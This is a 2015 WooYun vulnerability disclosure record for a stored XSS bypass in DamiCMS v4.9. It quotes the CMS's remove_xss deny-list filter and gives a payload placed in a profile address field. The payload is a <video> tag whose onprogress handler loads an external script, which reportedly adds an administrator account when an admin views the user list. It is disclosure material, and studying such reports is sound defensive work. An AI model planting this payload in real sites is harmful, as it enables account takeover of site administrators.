{"id": 40887, "wybug_id": "wooyun-2015-090539", "wybug_title": "大米CMS v4.9 绕过防御储存型xss。（ 附添加管理员poc）", "wybug_corp": "damicms.com", "wybug_author": "roker", "wybug_date": "2015-01-12 12:49", "wybug_open_date": "2015-04-13 16:58", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-15：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-03-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-13：\t细节向公众公开  简要描述： rt 详细说明：  remove_xss这个函数太弱了。\nfunction remove_xss($val) {   // remove all non-printable characters. CR(0a) and LF(0b) and TAB(9) are allowed   // this prevents some character re-spacing such as <java\\0script>   // note that you have to handle splits with \\n, \\r, and \\t later since they *are* allowed in some inputs   $val = preg_replace('/([\\x00-\\x08,\\x0b-\\x0c,\\x0e-\\x19])/', '', $val);   // straight replacements, the user should never need these since they're normal characters   // this prevents like <IMG SRC=@avascript:alert('XSS')>   $search = 'abcdefghijklmnopqrstuvwxyz';   $search .= 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';   $search .= '1234567890!@#$%^&*()';   $search .= '~`\";:?+/={}[]-_|\\'\\\\';   for ($i = 0; $i < strlen($search); $i++) {      // ;? matches the ;, which is optional      // 0{0,7} matches any padded zeros, which are optional and go up to 8 chars      // @ @ search for the hex values      $val = preg_replace('/(&#[xX]0{0,8}'.dechex(ord($search[$i])).';?)/i', $search[$i], $val); // with a ;      // @ @ 0{0,7} matches '0' zero to seven times      $val = preg_replace('/(&#0{0,8}'.ord($search[$i]).';?)/', $search[$i], $val); // with a ;   }   // now the only remaining whitespace attacks are \\t, \\n, and \\r   $ra1 = array('javascript', 'vbscript', 'expression', 'applet', 'meta', 'xml', 'blink', 'link', 'style', 'script', 'embed', 'object', 'iframe', 'frame', 'frameset', 'ilayer', 'layer', 'bgsound', 'title', 'base');   $ra2 = array('onabort', 'onactivate', 'onafterprint', 'onafterupdate', 'onbeforeactivate', 'onbeforecopy', 'onbeforecut', 'onbeforedeactivate', 'onbeforeeditfocus', 'onbeforepaste', 'onbeforeprint', 'onbeforeunload', 'onbeforeupdate', 'onblur', 'onbounce', 'oncellchange', 'onchange', 'onclick', 'oncontextmenu', 'oncontrolselect', 'oncopy', 'oncut', 'ondataavailable', 'ondatasetchanged', 'ondatasetcomplete', 'ondblclick', 'ondeactivate', 'ondrag', 'ondragend', 'ondragenter', 'ondragleave', 'ondragover', 'ondragstart', 'ondrop', 'onerror', 'onerrorupdate', 'onfilterchange', 'onfinish', 'onfocus', 'onfocusin', 'onfocusout', 'onhelp', 'onkeydown', 'onkeypress', 'onkeyup', 'onlayoutcomplete', 'onload', 'onlosecapture', 'onmousedown', 'onmouseenter', 'onmouseleave', 'onmousemove', 'onmouseout', 'onmouseover', 'onmouseup', 'onmousewheel', 'onmove', 'onmoveend', 'onmovestart', 'onpaste', 'onpropertychange', 'onreadystatechange', 'onreset', 'onresize', 'onresizeend', 'onresizestart', 'onrowenter', 'onrowexit', 'onrowsdelete', 'onrowsinserted', 'onscroll', 'onselect', 'onselectionchange', 'onselectstart', 'onstart', 'onstop', 'onsubmit', 'onunload');   $ra = array_merge($ra1, $ra2);   $found = true; // keep replacing as long as the previous round replaced something   while ($found == true) {      $val_before = $val;      for ($i = 0; $i < sizeof($ra); $i++) {         $pattern = '/';         for ($j = 0; $j < strlen($ra[$i]); $j++) {            if ($j > 0) {               $pattern .= '(';               $pattern .= '(&#[xX]0{0,8}([9ab]);)';               $pattern .= '|';               $pattern .= '|(&#0{0,8}([9|10|13]);)';               $pattern .= ')*';            }            $pattern .= $ra[$i][$j];         }         $pattern .= '/i';         $replacement = substr($ra[$i], 0, 2).'<x>'.substr($ra[$i], 2); // add in <> to nerf the tag         $val = preg_replace($pattern, $replacement, $val); // filter out the hex tags         if ($val_before == $val) {            // no replacements were made, so exit the loop            $found = false;         }      }   }   return $val;}?>\nonprogress就没过滤-。-修改用户资料，地址处填写 \n<video  src=http://www.baidu.com/img/baidu_jgylogo3.gif onprogress=$['get\\123cript']('http://localhost/a.js')>\n管理员打开后台 查看用户列表 即可触发加载了我们的js，（js代码见测试代码。）\n\n同时 post了数据自动添加了一个管理员账户。\n\n   漏洞证明：  如上所述   修复方案：  加强过滤   版权声明：转载请注明来源 roker@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2015-01-12 13:46 厂商回复： html5的出现造成了一些客户端新的xss注入，后台加强表单验证显得很重要 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-01-12 12:53 |    \t\t郭斯特 \t\t\t( 普通白帽子  |\t\t\t        Rank:181 漏洞数:69        | GhostWin)\t\t \n  吊死了    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}